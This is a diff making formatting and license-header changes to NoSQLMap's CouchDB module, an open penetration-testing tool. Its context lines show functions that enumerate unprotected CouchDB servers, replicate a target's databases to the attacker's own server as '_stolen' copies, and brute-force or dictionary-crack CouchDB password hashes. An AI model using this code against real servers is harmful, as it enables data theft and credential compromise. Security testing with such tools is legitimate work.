@@ -1,19 +1,6 @@
 #!/usr/bin/python
-#NoSQLMap Copyright 2016 Russell Butturini
-#This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-#the Free Software Foundation, either version 3 of the License, or
-#(at your option) any later version.
-
-#This program is distributed in the hope that it will be useful,
-#but WITHOUT ANY WARRANTY; without even the implied warranty of
-#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#GNU General Public License for more details.
-
-#You should have received a copy of the GNU General Public License
-#along with this program.  If not, see <http://www.gnu.org/licenses/>.
-
-
+# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
+# See the file 'doc/COPYING' for copying permission
 
 import couchdb
 import urllib
@@ -27,11 +14,13 @@ import itertools
 from hashlib import sha1
 import os
 
+
 global dbList
 global yes_tag
 global no_tag
 yes_tag = ['y', 'Y']
 no_tag = ['n', 'N']
+
 
 def couchScan(target,port,pingIt):
     if pingIt == True:
@@ -81,7 +70,7 @@ def netAttacks(target,port, myIP):
     mgtOpen = False
     webOpen = False
     mgtSelect = True
-    #This is a global for future use with other modules; may change
+    # This is a global for future use with other modules; may change
     dbList = []
     print "Checking to see if credentials are needed..."
     needCreds = couchScan(target,port,False)
@@ -117,7 +106,7 @@ def netAttacks(target,port, myIP):
 
 
     mgtUrl = "http://" + target + ":" + str(port) + "/_utils"
-    #Future rev:  Add web management interface parsing
+    # Future rev:  Add web management interface parsing
     try:
         mgtRespCode = urllib.urlopen(mgtUrl).getcode()
         if mgtRespCode == 200:
@@ -155,10 +144,12 @@ def netAttacks(target,port, myIP):
             if attack == "5":
                     return
 
+
 def getPlatInfo(couchConn, target):
     print "Server Info:"
     print "CouchDB Version: " + couchConn.version()
     return
+
 
 def enumAtt(conn,target):
     dbList = []
@@ -221,6 +212,7 @@ def enumDbs (couchConn,target,port):
 
     return
 
+
 def stealDBs (myDB,couchConn,target,port):
     dbLoot = True
     menuItem = 1
@@ -247,7 +239,7 @@ def stealDBs (myDB,couchConn,target,port):
             break
 
     try:
-        #Create the DB target first
+        # Create the DB target first
         myServer = couchdb.Server("http://" + myDB + ":5984")
         targetDB = myServer.create(dbList[int(dbLoot)-1] + "_stolen")
         couchConn.replicate(dbList[int(dbLoot)-1],"http://" + myDB + ":5984/" + dbList[int(dbLoot)-1] + "_stolen")
@@ -263,6 +255,7 @@ def stealDBs (myDB,couchConn,target,port):
     except:
         raw_input ("Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return...")
         return
+
 
 def passCrack (user, encPass, salt, dbVer):
     select = True
@@ -286,8 +279,10 @@ def passCrack (user, encPass, salt, dbVer):
                     return
     return
 
+
 def genBrute(chars, maxLen):
     return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))
+
 
 def brute_pass(hashVal,salt,dbVer):
     charSel = True
@@ -326,7 +321,7 @@ def brute_pass(hashVal,salt,dbVer):
         print "\rCombinations tested: " + str(count) + "\r"
         count += 1
 
-        #CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
+        # CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
         if float(dbVer[0:3]) < 1.3:
             gotIt = gen_pass_couch(attempt,salt,hashVal)
         else:
@@ -334,6 +329,7 @@ def brute_pass(hashVal,salt,dbVer):
 
         if gotIt == True:
                 break
+
 
 def dict_pass(key,salt,dbVer):
     loadCheck = False
@@ -354,7 +350,7 @@ def dict_pass(key,salt,dbVer):
     for passGuess in passList:
         temp = passGuess.split("\n")[0]
 
-        #CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
+        # CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
         if float(dbVer[0:3]) < 1.3:
             gotIt = gen_pass_couch(temp,salt,key)
         else:
@@ -365,6 +361,7 @@ def dict_pass(key,salt,dbVer):
 
     return
 
+
 def gen_pass_couch(passw, salt, hashVal):
     if sha1(passw+salt).hexdigest() == hashVal:
         print "Password Cracked - "+passw
@@ -372,6 +369,7 @@ def gen_pass_couch(passw, salt, hashVal):
 
     else:
         return False
+
 
 def gen_pass_couch13(passw, salt, iterations, hashVal):
 	result=PBKDF2(passw,salt,iterations).read(20)
